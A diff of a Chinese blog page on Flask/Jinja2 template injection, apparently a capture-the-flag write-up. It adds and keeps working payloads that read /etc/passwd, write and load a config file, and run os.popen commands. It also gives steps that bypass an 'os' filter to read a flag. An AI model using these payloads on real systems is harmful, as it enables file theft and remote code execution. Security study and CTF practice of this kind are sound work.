@@ -394,14 +394,14 @@ if _">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.4k
+                    1.7k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    7 分
+                    8 分
                 </div>
                 
 				
@@ -543,9 +543,16 @@ app<span class="token punctuation">.</span>secret_key <span class="token operato
 <pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__['open']('/etc/passwd').read()}}
 {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}</code></pre><p>任意文件写</p>
 <pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')}}</code></pre><p>执行,先通过上一步的写，然后执行</p>
-<pre><code>{{ config.from_pyfile('/tmp/owned.cfg') }}</code></pre><h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><p>任意文件读取</p>
+<pre><code>{{ config.from_pyfile('/tmp/owned.cfg') }}</code></pre><p>执行</p>
+<pre class=" language-python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">111.198</span><span class="token punctuation">.</span><span class="token number">29.45</span><span class="token punctuation">:</span><span class="token number">42293</span><span class="token operator">/</span><span class="token punctuation">{</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>func_globals<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("ls").read()'</span> <span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre>
+<h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><p>任意文件读取</p>
 <pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('d://whale.txt').read()}}</code></pre><p>一句指令任意执行</p>
-<pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}</code></pre><h3 id="Flask开启debug模式Pin安全"><a href="#Flask开启debug模式Pin安全" class="headerlink" title="Flask开启debug模式Pin安全"></a>Flask开启debug模式Pin安全</h3><p><a href="https://xz.aliyun.com/t/2553#toc-2" target="_blank" rel="noopener">参考https://xz.aliyun.com/t/2553#toc-2</a><br>代码</p>
+<pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}</code></pre><p>一个payload<br>2.<code>访问http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()%7D%7D</code>,来查看所有模块</p>
+<p>3.os模块都是从warnings.catch_warnings模块入手的，在所有模块中查找catch_warnings的位置，为第59个</p>
+<p>4.访问<code>http://192.168.100.161:62264/%7B%7B[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()%7D%7D</code>,查看catch_warnings模块都存在哪些全局函数，可以找到linecache函数，os模块就在其中</p>
+<p>5.使用[‘o’+’s’],可绕过对os字符的过滤，访问<code>http://192.168.100.161:62264/%7B%7B().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(%22os%22).popen(%22ls%22).read()&#39;%20)%7D%7D</code>查看flag文件所在</p>
+<p>6.访问<code>http://192.168.100.161:62264/%7B%7B%22%22.__class__.__mro__[2].__subclasses__()[40](%22fl4g%22).read()%7D%7D</code>,可得到flag</p>
+<h3 id="Flask开启debug模式Pin安全"><a href="#Flask开启debug模式Pin安全" class="headerlink" title="Flask开启debug模式Pin安全"></a>Flask开启debug模式Pin安全</h3><p><a href="https://xz.aliyun.com/t/2553#toc-2" target="_blank" rel="noopener">参考https://xz.aliyun.com/t/2553#toc-2</a><br>代码</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
 app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
 
@@ -956,7 +963,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">160.4k</span>&nbsp;字
+                class="white-color">160.6k</span>&nbsp;字
             
             
             
@@ -1139,6 +1146,6 @@ $(function () {
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/miku.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body>
 
 </html>
